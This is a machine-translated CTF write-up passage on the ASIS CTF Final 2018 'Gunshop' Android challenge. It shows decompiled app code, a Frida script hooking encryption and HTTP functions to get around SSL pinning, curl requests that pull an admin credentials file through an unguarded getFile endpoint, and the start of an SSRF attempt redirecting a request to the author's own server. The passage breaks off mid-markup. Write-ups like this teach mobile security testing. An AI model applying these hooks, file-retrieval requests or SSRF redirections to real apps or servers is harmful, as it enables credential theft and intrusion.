<html>
<head>
<title>Android Hook by Frida— ASIS CTF Final 2018 — Gunshop Questions Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">弗里达的Android Hook-ASIS CTF 2018年决赛-枪械店问题演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/android-hook-asis-ctf-final-2018-gunshops-question-walkthrough-ae5dfe8b5df0?source=collection_archive---------1-----------------------#2018-11-26">https://infosecwriteups.com/android-hook-asis-ctf-final-2018-gunshops-question-walkthrough-ae5dfe8b5df0?source=collection_archive---------1-----------------------#2018-11-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="dfba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参与者得到一把名为<strong class="jp ir"> GunShop.apk </strong>的APK。在安卓系统中打开APK会显示一个登录页面。我们继续分析应用程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/fe6dcc49a9b1930fb377c8cee85e0cf5.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/format:webp/1*5JNEHSsnrE1VLfl5mpXuFg.png"/></div></figure><h1 id="f881" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">客户端分析</h1><p id="861a" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">应用程序正在与具有额外加密层(AES/ECB/PKCS5Padding)的后端服务器进行交互。</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="9b9b" class="mb ku iq lx b gy mc md l me mf">public static String a(String str, Key key) {<br/>        Cipher instance = <strong class="lx ir">Cipher.getInstance("AES/ECB/PKCS5Padding");</strong><br/>        instance.init(1, key);<br/>        return Base64.encodeToString(instance.doFinal(str.getBytes("UTF-8")), 2);<br/>    }</span></pre><p id="4186" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">加密和解密功能:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="64d1" class="mb ku iq lx b gy mc md l me mf"><strong class="lx ir">public static String a(String str, Key key) {</strong><br/>        Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");<br/>        instance.init(1, key);<br/>        return Base64.encodeToString(instance.doFinal(str.getBytes("UTF-8")), 2);<br/>    }</span><span id="5258" class="mb ku iq lx b gy mg md l me mf"><strong class="lx ir">public static String b(String str, Key key) {</strong><br/>        Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");<br/>        instance.init(2, key);<br/>        return new String(instance.doFinal(Base64.decode(str, 2)), "UTF-8");<br/>    }</span></pre><p id="051e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">端点URL和加密密钥也由位于以下路径的另一个密钥加密:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="82f0" class="mb ku iq lx b gy mc md l me mf">/resources/assests/configKey<br/>/resources/assests/configUrl</span></pre><p id="c14b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分析应用程序导致发现主要的关键。关键是android应用程序符号的<code class="fe mh mi mj lx b">SHA-256</code>散列。</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="c69c" class="mb ku iq lx b gy mc md l me mf">public static String a(Context context, String str) {<br/>        if (str == null) {<br/>            return null;<br/>        }<br/>        try {<br/>            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(str, 64);<br/>            if (packageInfo.signatures.length != 1) {<br/>                return null;<br/>            }<br/>            <strong class="lx ir">return b(MessageDigest.getInstance("SHA-256").digest(packageInfo.signatures[0].toByteArray())).substring(0, 16);</strong><br/>        } catch (NameNotFoundException e) {<br/>            return null;<br/>        } catch (NoSuchAlgorithmException e2) {<br/>            return null;<br/>        }<br/>    }</span></pre><p id="a0ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该应用程序也使用SSL-Pin，因此，该请求无法被拦截。解决这个问题的两种方法:</p><ol class=""><li id="2b73" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated">挂接一个函数或寻找内存读取和的解密值，然后在<strong class="jp ir">/resources/assets/</strong>中将加密值替换为解密值，使解密函数返回<code class="fe mh mi mj lx b">true</code>并且对<strong class="jp ir">/resources/assets/</strong>中的文件不做任何操作，移除SSL-Pin并拦截请求。</li><li id="1e01" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">挂钩重要的函数来查看请求/响应，以便模糊输入。</li></ol><p id="1ea2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">选择的第二种方法。打开弗里达:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="5af2" class="mb ku iq lx b gy mc md l me mf">frida -U -l scripts.js android.gunshop.com.gunshop                                                                                                          ✔  3554  18:02:29<br/>     ____<br/>    / _  |   Frida 12.2.25 - A world-class dynamic instrumentation toolkit<br/>   | (_| |<br/>    &gt; _  |   Commands:<br/>   /_/ |_|       help      -&gt; Displays the help system<br/>   . . . .       object?   -&gt; Display information about 'object'<br/>   . . . .       exit/quit -&gt; Exit<br/>   . . . .<br/>   . . . .   More info at <a class="ae my" href="http://www.frida.re/docs/home/" rel="noopener ugc nofollow" target="_blank">http://www.frida.re/docs/home/</a><br/>Attaching...                                                            <br/>Script loaded successfully<br/>HTTP Request<br/>[Unknown Samsung Galaxy S6 - 5.0.0 - API 21 - 1440x2560::android.gunshop.com.gunshop]-&gt;</span></pre><h1 id="cfd5" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">解决方案—第1部分</h1><p id="96de" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">第一件事是揭示端点URL。函数<strong class="jp ir"> a(String str，String str) </strong>处理HTTP请求:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="b9ba" class="mb ku iq lx b gy mc md l me mf">public static String a(String str, String str2) {<br/>        String str3 = "";<br/>        HttpsURLConnection httpsURLConnection = (HttpsURLConnection) new URL(str).openConnection();<br/>        CookieManager instance = CookieManager.getInstance();<br/>        String cookie = instance.getCookie(httpsURLConnection.getURL().toString());<br/>        if (cookie != null) {<br/>            httpsURLConnection.setRequestProperty("Cookie", cookie);<br/>        }<br/>        httpsURLConnection.setSSLSocketFactory(SSLCertificateSocketFactory.getInsecure(0, null));<br/>        httpsURLConnection.setHostnameVerifier(new AllowAllHostnameVerifier());<br/>        httpsURLConnection.setReadTimeout(15000);<br/>        httpsURLConnection.setConnectTimeout(15000);<br/>        httpsURLConnection.setRequestMethod("POST");<br/>        httpsURLConnection.setDoInput(true);<br/>        httpsURLConnection.setDoOutput(true);<br/>        httpsURLConnection.connect();<br/>        if (a(httpsURLConnection, a)) {<br/>            OutputStream outputStream = httpsURLConnection.getOutputStream();<br/>            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));<br/>            bufferedWriter.write(str2);<br/>            bufferedWriter.flush();<br/>            bufferedWriter.close();<br/>            outputStream.close();<br/>            if (httpsURLConnection.getResponseCode() != 200) {<br/>                return "";<br/>            }<br/>            List&lt;String&gt; list = (List) httpsURLConnection.getHeaderFields().get("Set-Cookie");<br/>            if (list != null) {<br/>                for (String cookie2 : list) {<br/>                    instance.setCookie(httpsURLConnection.getURL().toString(), cookie2);<br/>                }<br/>            }<br/>            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));<br/>            cookie2 = str3;<br/>            while (true) {<br/>                str3 = bufferedReader.readLine();<br/>                if (str3 == null) {<br/>                    break;<br/>                }<br/>                cookie2 = cookie2 + str3;<br/>            }<br/>            String headerField = httpsURLConnection.getHeaderField("X-GUN-SHOP");<br/>            if (headerField != null &amp;&amp; !headerField.isEmpty()) {<br/>                return cookie2;<br/>            }<br/>            throw new Exception(cookie2);<br/>        }<br/>        <strong class="lx ir">throw new Exception("SSL Pin Error");</strong><br/>    }</span></pre><p id="4c2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过<a class="ae my" href="https://www.frida.re/docs/android/" rel="noopener ugc nofollow" target="_blank"> Frida </a>挂接HTTP请求函数:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="6f86" class="mb ku iq lx b gy mc md l me mf">Java.perform(function z() {<br/>    console.log("HTTP Request");<br/>    var my_class = Java.use("android.gunshop.com.gunshop.m");<br/>    my_class.a.overload('java.lang.String', 'java.lang.String').implementation = function (str, str2) {<br/>        console.log("original call: HTTP-Request(" + "input1: " + str + ", " + "input2: " + str2.toString() + ")");<br/>        var ret_value = this.a(str, str2);<br/>        console.log("return value HTTP-Request: " + ret_value + "\n\n");<br/>        return ret_value;<br/>    }<br/>});</span></pre><p id="a9ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Frida控制台上:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="17bc" class="mb ku iq lx b gy mc md l me mf">original call: Encrypt(input1: {"username":"utfu","password":"utfu","device-id":"3d8b0f8219c4b301"}, input2: 31323334353637383961733233343536)<br/>return value a  vDIh9PNlTJI25p/Ku4jAn4YSgjI9+J6Qnc/B9StKPo9iTsYJPBMiVAxlzvRj4VdsPZx0INmSKpvSUiDaatBnXH9gLYHmpa2f/4zycBhloeg=</span><span id="bb8b" class="mb ku iq lx b gy mg md l me mf">original call: HTTP-Request(input1: <strong class="lx ir">https://darkbloodygunshop.asisctf.com/startSession</strong>, input2: user_data=vDIh9PNlTJI25p%2FKu4jAn4YSgjI9%2BJ6Qnc%2FB9StKPo9iTsYJPBMiVAxlzvRj4VdsPZx0INmSKpvSUiDaatBnXH9gLYHmpa2f%2F4zycBhloeg%3D)</span></pre><p id="4741" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">发现了终点。打开URL:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="f97a" class="mb ku iq lx b gy mc md l me mf">&gt; GET /startSession HTTP/1.1<br/>&gt; Host: darkbloodygunshop.asisctf.com<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt; <br/>&lt; HTTP/1.1 405 METHOD NOT ALLOWED<br/>&lt; Server: nginx/1.10.3<br/>&lt; Date: Mon, 26 Nov 2018 14:28:04 GMT<br/>&lt; Content-Type: text/html<br/>&lt; Content-Length: 178<br/>&lt; Connection: keep-alive<br/>&lt; Allow: OPTIONS, POST<br/>&lt; Set-Cookie: session=41f3e699-c94b-488c-8298-8473bceeb28a; Expires=Thu, 27-Dec-2018 14:28:04 GMT; HttpOnly; Path=/<br/>&lt; <br/>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br/>&lt;title&gt;405 Method Not Allowed&lt;/title&gt;<br/>&lt;h1&gt;Method Not Allowed&lt;/h1&gt;<br/>&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;<br/>* Connection #0 to host darkbloodygunshop.asisctf.com left intact</span></pre><p id="cc85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问索引:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="93a4" class="mb ku iq lx b gy mc md l me mf">&gt; GET / HTTP/1.1<br/>&gt; Host: darkbloodygunshop.asisctf.com<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt; <br/>&lt; HTTP/1.1 200 OK<br/>&lt; Server: nginx/1.10.3<br/>&lt; Date: Mon, 26 Nov 2018 14:28:34 GMT<br/>&lt; Content-Type: text/html; charset=utf-8<br/>&lt; Content-Length: 26<br/>&lt; Connection: keep-alive<br/>&lt; Set-Cookie: session=4a988c06-2872-4a90-943d-a3292bd8042c; Expires=Thu, 27-Dec-2018 14:28:34 GMT; HttpOnly; Path=/<br/>&lt; <br/>* Connection #0 to host darkbloodygunshop.asisctf.com left intact<br/><strong class="lx ir">Missing parameter username</strong></span></pre><p id="65fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据提示:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="dbb7" class="mb ku iq lx b gy mc md l me mf">&gt; GET /?username=test HTTP/1.1<br/>&gt; Host: darkbloodygunshop.asisctf.com<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt; <br/>&lt; HTTP/1.1 200 OK<br/>&lt; Server: nginx/1.10.3<br/>&lt; Date: Mon, 26 Nov 2018 14:29:11 GMT<br/>&lt; Content-Type: text/html; charset=utf-8<br/>&lt; Content-Length: 46<br/>&lt; Connection: keep-alive<br/>&lt; Set-Cookie: session=c78406db-5a31-40ab-ba3d-1926c735459f; Expires=Thu, 27-Dec-2018 14:29:11 GMT; HttpOnly; Path=/<br/>&lt; <br/>* Connection #0 to host darkbloodygunshop.asisctf.com left intact<br/><strong class="lx ir">username not found in users_gunshop_admins.csv</strong></span></pre><p id="4b7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该文件包含通过错误/调试消息显示的凭据。挖掘更多的Android应用程序导致发现一个相对路径似乎把文件作为输入:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="cc3e" class="mb ku iq lx b gy mc md l me mf">protected Bitmap doInBackground(String... strArr) {<br/>        Bitmap bitmap = null;<br/>        try {<br/>            return m.c(MainActivity.a + "<strong class="lx ir">/getFile?filename=</strong>" + strArr[0]);<br/>        } catch (Exception e) {<br/>            Log.e("Error", e.getMessage());<br/>            e.printStackTrace();<br/>            return bitmap;<br/>        }<br/>    }</span></pre><p id="f2e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在提取凭据:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="52b6" class="mb ku iq lx b gy mc md l me mf">&gt; GET /getFile?filename=users_gunshop_admins.csv HTTP/1.1<br/>&gt; Host: darkbloodygunshop.asisctf.com<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt; <br/>&lt; HTTP/1.1 200 OK<br/>&lt; Server: nginx/1.10.3<br/>&lt; Date: Mon, 26 Nov 2018 14:31:28 GMT<br/>&lt; Content-Type: text/csv; charset=utf-8<br/>&lt; Content-Length: 25<br/>&lt; Connection: keep-alive<br/>&lt; Content-Disposition: attachment; filename=users_gunshop_admins.csv<br/>&lt; Last-Modified: Sat, 18 Aug 2018 06:44:50 GMT<br/>&lt; Cache-Control: public, max-age=43200<br/>&lt; Expires: Tue, 27 Nov 2018 02:31:28 GMT<br/>&lt; ETag: "1534574690.0-25-3882554259"<br/>&lt; Accept-Ranges: bytes<br/>&lt; Set-Cookie: session=c31d434a-cbd3-40ed-b7b1-4f45bc1484c8; Expires=Thu, 27-Dec-2018 14:31:28 GMT; HttpOnly; Path=/<br/>&lt; <br/><strong class="lx ir">alfredo,YhFyP$d*epmj9PUz</strong></span></pre><p id="d488" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，挂钩加密/解密函数:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="d691" class="mb ku iq lx b gy mc md l me mf">console.log("Script loaded successfully");<br/>Java.perform(function x() { <br/>    console.log("Encryption Function Hooked");</span><span id="3e5e" class="mb ku iq lx b gy mg md l me mf">var my_class = Java.use("android.gunshop.com.gunshop.m");</span><span id="e6aa" class="mb ku iq lx b gy mg md l me mf">my_class.b.overload('java.lang.String', 'java.security.Key').implementation = function (str, key) {</span><span id="3281" class="mb ku iq lx b gy mg md l me mf">var b = key.getEncoded();<br/>        var printable_key = ""<br/>        for (var i = 0; i &lt; b.length; i++) {</span><span id="ed18" class="mb ku iq lx b gy mg md l me mf">printable_key += (b[i].toString(16) + "");</span><span id="dcac" class="mb ku iq lx b gy mg md l me mf">}</span><span id="30cf" class="mb ku iq lx b gy mg md l me mf">console.log("original call: Decrypt(" + "input1: " + str + ", " + "input2: " + printable_key + ")");</span><span id="a130" class="mb ku iq lx b gy mg md l me mf">var ret_value = this.b(str, key);<br/>        console.log("return value b  " + ret_value + "\n\n");<br/>        return ret_value;<br/>    }<br/>});<br/>Java.perform(function y() {<br/>    console.log("Encryption Function Hooked");<br/>    var my_class = Java.use("android.gunshop.com.gunshop.m");</span><span id="2555" class="mb ku iq lx b gy mg md l me mf">my_class.a.overload('java.lang.String', 'java.security.Key').implementation = function (str, key) {</span><span id="769f" class="mb ku iq lx b gy mg md l me mf">var b = key.getEncoded();<br/>        var printable_key = ""<br/>        for (var i = 0; i &lt; b.length; i++) {</span><span id="a921" class="mb ku iq lx b gy mg md l me mf">printable_key += (b[i].toString(16) + "");</span><span id="55bf" class="mb ku iq lx b gy mg md l me mf">}</span><span id="37b0" class="mb ku iq lx b gy mg md l me mf">console.log("original call: Encrypt(" + "input1: " + str + ", " + "input2: " + printable_key + ")");<br/>        var ret_value = this.a(str, key);<br/>        console.log("return value a  " + ret_value + "\n\n");<br/>        return ret_value;<br/>    }<br/>});</span></pre><p id="b5ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后使用显示的凭据登录:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="4f18" class="mb ku iq lx b gy mc md l me mf">Encryption Function Hooked<br/>Encryption Function Hooked<br/>HTTP Request<br/>original call: Encrypt(input1: {<strong class="lx ir">"username":"alfredo","password":"YhFyP$d*epmj9PUz"</strong>,"device-id":"3d8b0f8219c4b301"}, input2: 31323334353637383961733233343536)<br/>return value a  0JjOmMth2l+n+Xmw3RlvcHzfA2HZbR58OvVHc4V7GcJ6LMonOfw8PBIuMrzE2zNGlsMtJTqnXEUOiTiCMQ3540kgeQbDgE0JZ973HcGaOn4eGRw0uZRx7mkZ1sxOA29D</span><span id="d95d" class="mb ku iq lx b gy mg md l me mf">original call: HTTP-Request(input1: <a class="ae my" href="https://darkbloodygunshop.asisctf.com/startSession" rel="noopener ugc nofollow" target="_blank">https://darkbloodygunshop.asisctf.com/startSession</a>, input2: user_data=0JjOmMth2l%2Bn%2BXmw3RlvcHzfA2HZbR58OvVHc4V7GcJ6LMonOfw8PBIuMrzE2zNGlsMtJTqnXEUOiTiCMQ3540kgeQbDgE0JZ973HcGaOn4eGRw0uZRx7mkZ1sxOA29D)<br/>return value HTTP-Request: jjIDPwljJ9cUm8mLk9kbZxlSZg7Y55rtv/iHDzvQJjzBpw/nBHMFBdDOc7mSyrhB+KCIjpJWpVpQqYkK/ePVxTxuJ9D3qrNvXe2bSBT2RaoW6O+Br97cAU9Ts7shulfMNpeSxN2nOi5XH9HkUBoP6taaJV6YAVjWK+IrzLnY3zM1pCYm3R4J/KS+prKqqEEgBq+lUUOpI2lippXD+48PEEBVpbCUz7cn2UScrHO0AQ7A/SQPqmcZMkDDv2S2CYrxk9RhykMVQ+v94/5/RfIzGURkKkZ0a+zOLlzf2NZSZPvAkyPN8M0SrvGEBYtPJrgLZmapEW2uP5XOWhAZV2Oh29c63vRtwy3vBrOuy3rk12ePG0Ptdoth8okvA56bNQ1/EVBHuhWnvvRnL19Fir4pbSXqtuB50ZBR8NIUiLKS7Ve/lhB6lHA6hg2n2g/Vbvlf9dIk8VpA4vSNAdtfrJhvy+SYsTLS7mGqL+HASJxDAVD/5Ytti+o0aXTHojUI27Z6oVMgIU3x206vG9x1Gtk/QPBt4TnZz9eo0NmU7T6u+yLXEGPUtQSWncTbmBQPwVpHwqEkkxKEoXq1qkzv6+qWPJkHhrTQgt+6md1tJ0gFsO435CfAHnd/HJGsHn73SfnASKB+cmYyacajvpG2VLwk6JOnG2NINOelsWenBf4+Cokl+aY4E23d98HsvD9IfApjmyNDRhfP4mSEppDuhGVboVySfZpIdKD8qWqf/BkX+OZ+lFzqOoU+McVObhkVy/xnS/xhKHkcsoyf5tYkgcbfxbcoUh4oRbFNSzvcsEC2VxFossjFBE5vC7KXvbgDtft88fGUqTYnaV9+q3WlHSvj3CFQCsRjHBzrAMYnHVMBLM0VkSCppkSMs4CxIwG5NFO6PkJKq4L06i8T9pMs/uh9w1bIuamuafTYN8rFcH7dDMuwc5x7tEvdYZSlYTPsGvylSKHggsSRwoAdQuAPcQ5AVtzWI+Vb6U3AqXYfS3y4ys+iPwndtLlOEif3YU+j5PoiAIkdHcC6oNItRDJuga0KP4uXyr4KXT6UOfxBAKKvgXveDjWrzDirkroAF9y4ygTQe5hggEdPgd+2NcZgJ90t812F5i6/sccomd2GvX8supAqjuD4D9Xvxs9jK6vol7jbwPJFPimYn2UvJ0JfE5Y29LwL8PWVinwx2ptAIr7qC7vBD6Cb/mOgT7GHos1tqpHR</span><span id="b613" class="mb ku iq lx b gy mg md l me mf">original call: Decrypt(input1: jjIDPwljJ9cUm8mLk9kbZxlSZg7Y55rtv/iHDzvQJjzBpw/nBHMFBdDOc7mSyrhB+KCIjpJWpVpQqYkK/ePVxTxuJ9D3qrNvXe2bSBT2RaoW6O+Br97cAU9Ts7shulfMNpeSxN2nOi5XH9HkUBoP6taaJV6YAVjWK+IrzLnY3zM1pCYm3R4J/KS+prKqqEEgBq+lUUOpI2lippXD+48PEEBVpbCUz7cn2UScrHO0AQ7A/SQPqmcZMkDDv2S2CYrxk9RhykMVQ+v94/5/RfIzGURkKkZ0a+zOLlzf2NZSZPvAkyPN8M0SrvGEBYtPJrgLZmapEW2uP5XOWhAZV2Oh29c63vRtwy3vBrOuy3rk12ePG0Ptdoth8okvA56bNQ1/EVBHuhWnvvRnL19Fir4pbSXqtuB50ZBR8NIUiLKS7Ve/lhB6lHA6hg2n2g/Vbvlf9dIk8VpA4vSNAdtfrJhvy+SYsTLS7mGqL+HASJxDAVD/5Ytti+o0aXTHojUI27Z6oVMgIU3x206vG9x1Gtk/QPBt4TnZz9eo0NmU7T6u+yLXEGPUtQSWncTbmBQPwVpHwqEkkxKEoXq1qkzv6+qWPJkHhrTQgt+6md1tJ0gFsO435CfAHnd/HJGsHn73SfnASKB+cmYyacajvpG2VLwk6JOnG2NINOelsWenBf4+Cokl+aY4E23d98HsvD9IfApjmyNDRhfP4mSEppDuhGVboVySfZpIdKD8qWqf/BkX+OZ+lFzqOoU+McVObhkVy/xnS/xhKHkcsoyf5tYkgcbfxbcoUh4oRbFNSzvcsEC2VxFossjFBE5vC7KXvbgDtft88fGUqTYnaV9+q3WlHSvj3CFQCsRjHBzrAMYnHVMBLM0VkSCppkSMs4CxIwG5NFO6PkJKq4L06i8T9pMs/uh9w1bIuamuafTYN8rFcH7dDMuwc5x7tEvdYZSlYTPsGvylSKHggsSRwoAdQuAPcQ5AVtzWI+Vb6U3AqXYfS3y4ys+iPwndtLlOEif3YU+j5PoiAIkdHcC6oNItRDJuga0KP4uXyr4KXT6UOfxBAKKvgXveDjWrzDirkroAF9y4ygTQe5hggEdPgd+2NcZgJ90t812F5i6/sccomd2GvX8supAqjuD4D9Xvxs9jK6vol7jbwPJFPimYn2UvJ0JfE5Y29LwL8PWVinwx2ptAIr7qC7vBD6Cb/mOgT7GHos1tqpHR, input2: 31323334353637383961733233343536)<br/>return value b  {"key": "3b69e03666ebba1d18a76df51a4704c2", "deviceId": "3d8b0f8219c4b301", "flag1": "<strong class="lx ir">ASIS{d0Nt_KI11_M3_G4NgsteR}</strong>", "list": [{"pic": "1.jpg", "id": "GN12-34", "name": "Tiny Killer", "description": "Excellent choise for silent killers."}, {"pic": "2.jpg", "id": "GN12-301", "name": "Gru Gun", "description": "A magic underground weapon."}, {"pic": "3.png", "id": "GN12-1F52B", "name": "U+1F52B", "description": "Powerfull electronic gun. Usefull in chat rooms and twitter."}, {"pic": "4.jpeg", "id": "GN12-1", "name": "HV-Penetrator", "description": "The Gun of future."}, {"pic": "5.jpg", "id": "GN12-90", "name": "Riffle", "description": "Protect your self with me."}, {"pic": "6.png", "id": "GN12-21", "name": "Gun Shop Subscription", "description": "Subscription 1 month to gun shop."}, {"pic": "7.png", "id": "GN12-1002", "name": "GunSet", "description": "A Set of weapons, useful for assassins."}]}</span></pre><h1 id="8766" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">解决方案—第2部分</h1><p id="7026" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">成功登录后，显示了几把枪。申请的工作流程是选择一把枪，然后提交购买它。这个流包含两个独立的HTTP请求:</p><pre class="km kn ko kp gt lw lx ly lz aw ma bi"><span id="2929" class="mb ku iq lx b gy mc md l me mf">original call: Encrypt(input1: {"gunId":"GN12-34"}, input2: 474a-5e-21-666f-7b7174311f9-335c)<br/>return value a  d/DDO//gJN0c8Cmu9/0it2PUnxFfnfFQyiBakgTRNqY=</span><span id="6764" class="mb ku iq lx b gy mg md l me mf">original call: HTTP-Request(input1: https://darkbloodygunshop.asisctf.com/selectGun, input2: user_data=d%2FDDO%2F%2FgJN0c8Cmu9%2F0it2PUnxFfnfFQyiBakgTRNqY%3D)<br/>return value HTTP-Request: 220YCO3gST2F/ew+kLfYjCcFsxqNrcpPsBxKfFAqZEhIUi9fGEs3GaOV5DiHrumezGU9mBE8fGFUVQK3k4sRGI4KqchWje52++U2gvWornu77m42QDdb3sdkkviqei01</span><span id="627a" class="mb ku iq lx b gy mg md l me mf">original call: Decrypt(input1: 220YCO3gST2F/ew+kLfYjCcFsxqNrcpPsBxKfFAqZEhIUi9fGEs3GaOV5DiHrumezGU9mBE8fGFUVQK3k4sRGI4KqchWje52++U2gvWornu77m42QDdb3sdkkviqei01, input2: 474a-5e-21-666f-7b7174311f9-335c)<br/>return value b  {"shop": {"name": "City Center Shop", "url": "http://188.166.76.14:42151/DBdwGcbFDApx93J3"}}</span><span id="66d3" class="mb ku iq lx b gy mg md l me mf">original call: Encrypt(input1: {"shop":"<strong class="lx ir">http:\/\/188.166.76.14:42151\/DBdwGcbFDApx93J3</strong>"}, input2: 474a-5e-21-666f-7b7174311f9-335c)<br/>return value a  ahv2s2OPlVD80fZgoaLcg3K7uSJYZOllph4rAEtUkbPP4N1PriGbfeZ9nqymI1Zf3DumuFStgVvv3JRJqjONQA==</span><span id="4f79" class="mb ku iq lx b gy mg md l me mf">original call: HTTP-Request(input1: https://darkbloodygunshop.asisctf.com/finalizeSession, input2: user_data=ahv2s2OPlVD80fZgoaLcg3K7uSJYZOllph4rAEtUkbPP4N1PriGbfeZ9nqymI1Zf3DumuFStgVvv3JRJqjONQA%3D%3D)<br/>return value HTTP-Request: zRg8II6acb6ozVqb2agJcxxV6vKtqdIrLN2VhpKHaLP/qsH4iDhHcfvBi8vbNZCMbeH4mo6EAqjSAs9d9Seo4D1GRrYY8qqvRdlS5LkOHlCKlVOBSQNobl1JwaroWd6MzWkySfCrTyjiKBMgjPsSDQ==</span><span id="b1d4" class="mb ku iq lx b gy mg md l me mf">original call: Decrypt(input1: zRg8II6acb6ozVqb2agJcxxV6vKtqdIrLN2VhpKHaLP/qsH4iDhHcfvBi8vbNZCMbeH4mo6EAqjSAs9d9Seo4D1GRrYY8qqvRdlS5LkOHlCKlVOBSQNobl1JwaroWd6MzWkySfCrTyjiKBMgjPsSDQ==, input2: 474a-5e-21-666f-7b7174311f9-335c)<br/>return value b  {"result": "Your request submitted and will be ready as soon as possible. Thanks for shopping. Happy killing."</span></pre><p id="7228" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">花了几个小时模糊应用程序，这是半硬没有打嗝套件，因为:</p><ol class=""><li id="345e" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated">登录后，给出了新的AES密钥</li><li id="260a" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">接下来的两个HTTP请求由新密钥加密</li><li id="e851" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated">请求无法重播两次，应用程序在两次请求后停止工作</li></ol><p id="8809" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一个请求是可疑的，因为它有一个URL:</p><p id="75be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我想到的第一件事是SSRF攻击，所以我修改了<code class="fe mh mi mj lx b">scirpt.js</code>,用我的服务器IP地址替换了URL:</p><pre class="km kn ko kp gt 